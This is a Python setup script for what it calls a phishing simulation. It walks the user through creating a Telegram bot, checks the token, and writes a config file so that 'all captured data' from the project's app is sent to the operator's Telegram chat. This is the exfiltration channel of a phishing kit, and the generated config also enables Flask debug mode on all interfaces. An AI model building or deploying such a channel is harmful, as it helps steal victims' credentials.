#!/usr/bin/env python3
"""
Telegram Bot Setup Script

This script helps configure the Telegram bot for the phishing simulation project.
It will update the config.py file with your Telegram bot token and chat ID.
"""

import os
import sys
import re
import requests

def print_header():
    """Print the script header."""
    print("\n" + "="*80)
    print("Telegram Bot Setup for Phishing Simulation".center(80))
    print("="*80 + "\n")

def print_instructions():
    """Print setup instructions."""
    print("This script will help you set up your Telegram bot configuration.\n")
    print("You will need:")
    print("1. A Telegram bot token (get it from @BotFather)")
    print("2. Your Telegram chat ID (get it from @userinfobot)\n")
    print("Step-by-step instructions:")
    print("1. Open Telegram and search for @BotFather")
    print("2. Send /newbot command and follow the instructions to create a new bot")
    print("3. BotFather will give you a token like '123456789:ABCdefGhIJKlmnOPQRstUVwxYZ'")
    print("4. Then, search for @userinfobot and send it any message")
    print("5. It will respond with your ID like 'Your ID: 123456789'\n")

def validate_token(token):
    """Validate the bot token format and connectivity."""
    # Check format
    if not re.match(r"^\d+:[\w-]+$", token):
        print("[ERROR] Invalid token format. It should look like '123456789:ABCdefGhIJKlmnOPQRstUVwxYZ'")
        return False
    
    # Test connection
    try:
        url = f"https://api.telegram.org/bot{token}/getMe"
        response = requests.get(url)
        if response.status_code != 200:
            print("[ERROR] Invalid token. Could not connect to Telegram API.")
            return False
        
        data = response.json()
        if not data.get('ok'):
            print("[ERROR] Token validation failed:", data.get('description', 'Unknown error'))
            return False
        
        print(f"[SUCCESS] Bot connected successfully! Bot name: @{data['result']['username']}")
        return True
    except Exception as e:
        print(f"[ERROR] Connection test failed: {e}")
        return False

def validate_chat_id(token, chat_id):
    """Validate the chat ID."""
    try:
        # Check if chat_id is a number
        int(chat_id)  # This will raise ValueError if not a number
        
        # Try to send a test message
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        data = {
            "chat_id": chat_id,
            "text": "âœ… Bot setup successful! You will now receive phishing simulation data here."
        }
        response = requests.post(url, data=data)
        
        if response.status_code != 200:
            print("[ERROR] Failed to send message to chat ID:", chat_id)
            return False
        
        print("[SUCCESS] Test message sent successfully!")
        return True
    except ValueError:
        print("[ERROR] Chat ID should be a number.")
        return False
    except Exception as e:
        print(f"[ERROR] Chat ID validation failed: {e}")
        return False

def update_config_file(token, chat_id):
    """Update the config.py file with the provided credentials."""
    try:
        config_content = f'''# Telegram Bot Configuration
# This file was auto-generated by setup_telegram.py

# Your bot token from BotFather (https://t.me/BotFather)
TELEGRAM_BOT_TOKEN = "{token}"

# Your chat ID (can be your personal chat ID or a group chat ID)
TELEGRAM_CHAT_ID = "{chat_id}"

# Flask configuration
FLASK_DEBUG = True
FLASK_HOST = "0.0.0.0"
FLASK_PORT = 5000
'''
        
        with open('config.py', 'w') as f:
            f.write(config_content)
        
        print("[SUCCESS] Configuration saved to config.py")
        return True
    except Exception as e:
        print(f"[ERROR] Failed to update config file: {e}")
        return False

def main():
    """Main function to run the setup process."""
    print_header()
    print_instructions()
    
    try:
        token = input("\nEnter your Telegram bot token: ").strip()
        if not validate_token(token):
            print("\nPlease check your token and try again.")
            return
        
        chat_id = input("\nEnter your Telegram chat ID: ").strip()
        if not validate_chat_id(token, chat_id):
            print("\nPlease check your chat ID and try again.")
            return
        
        update_config_file(token, chat_id)
        
        print("\n" + "="*80)
        print("Setup Complete! Your Telegram bot is now configured.".center(80))
        print("="*80)
        print("\nYou can now run the application with: python app.py")
        print("All captured data will be sent to your Telegram chat.")
        
    except KeyboardInterrupt:
        print("\n\nSetup cancelled by user.")
    except Exception as e:
        print(f"\n[ERROR] An unexpected error occurred: {e}")

if __name__ == "__main__":
    main() 